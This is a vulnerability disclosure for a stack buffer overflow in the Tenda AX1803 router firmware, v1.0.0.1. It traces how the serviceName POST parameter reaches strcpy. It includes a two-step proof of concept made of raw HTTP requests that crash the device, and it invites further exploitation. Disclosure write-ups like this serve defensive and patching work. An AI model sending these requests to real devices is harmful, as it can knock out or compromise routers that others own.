# Tenda AX1803 v1.0.0.1 contains a stack overflow via the serviceName parameter in the function fromAdvSetMacMtuWan

## Firmware infomation

- Manufacturer's address：https://www.tenda.com.cn/
- Affected firmware infomation：https://www.tenda.com.cn/download/detail-3421.html
- Affected firmware version：v1.0.0.1

## Vulnerability Description

The `form_fast_setting_internet_set` function in Tenda AX1803 v1.0.0.1 first extracts the value of the `netWanType` parameter from the POST request, and then passes this value to the `sub_569BC` function as the third parameter. By controlling the content of the POST request, we set the value of the `netWanType` parameter to 2, which is then passed as the third parameter to the `sub_569BC` function.
![QQ截图20240319205702](https://github.com/re1wn/IoT_vuln/assets/73987057/d399fc96-7563-4810-bcaa-d7906788ec41)
In the `sub_569BC` function, the `sprintf` function is utilized to concatenate the `wan1.connecttype` string. Subsequently, the `SetValue` function is employed to assign the value of the environment variable `wan1.connecttype` to the third parameter `a3` passed into the `sub_569BC` function, with a value of 2.
![QQ截图20240319205842](https://github.com/re1wn/IoT_vuln/assets/73987057/aec0e329-4f55-4fc9-af3c-990a4283b9dd)
The focus moves to the `fromAdvSetMacMtuWan` function. Here, the value "2" obtained from the POST request for the environment variable string `wan1.connecttype` is passed to `v6`, triggering the execution of the `sub_8C594` function.
![QQ截图20240319211358](https://github.com/re1wn/IoT_vuln/assets/73987057/9f6e0dae-1e37-472c-b996-24ac6b0e64ab)
In the `sub_8C594` function, the value of the `serviceName` parameter is extracted from the POST request, and then passed to the `strcpy` function, resulting in a buffer overflow.
![QQ截图20240319211701](https://github.com/re1wn/IoT_vuln/assets/73987057/026d7e87-40c4-4cec-9244-3f7048488b13)
## POC

First SetValue with poc:

```
POST /goform/fast_setting_internet_set HTTP/1.1
Host: 192.168.76.149
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: password=002a77b3f3cdec7e900d0be9a911fb6bpvwtgb
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

netWanType=2&adslUser=aaaa&adslPwd=aaaa
```

Then call fromAdvSetMacMtuWan and trigger overflow.

```
POST /goform/AdvSetMacMtuWan HTTP/1.1
Host: 192.168.76.149
Content-Length: 56
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.76.149
Referer: http://192.168.76.149/mac_clone.html?random=0.7547959184452664&
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

wanMTU=1285&wanSpeed=0&cloneType=0&mac=00:00:00:00:00:01&serviceName=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&serverName=
```

We trigger a stack overflow vulnerability after sending the poc, and you may modify this for further exploiting.

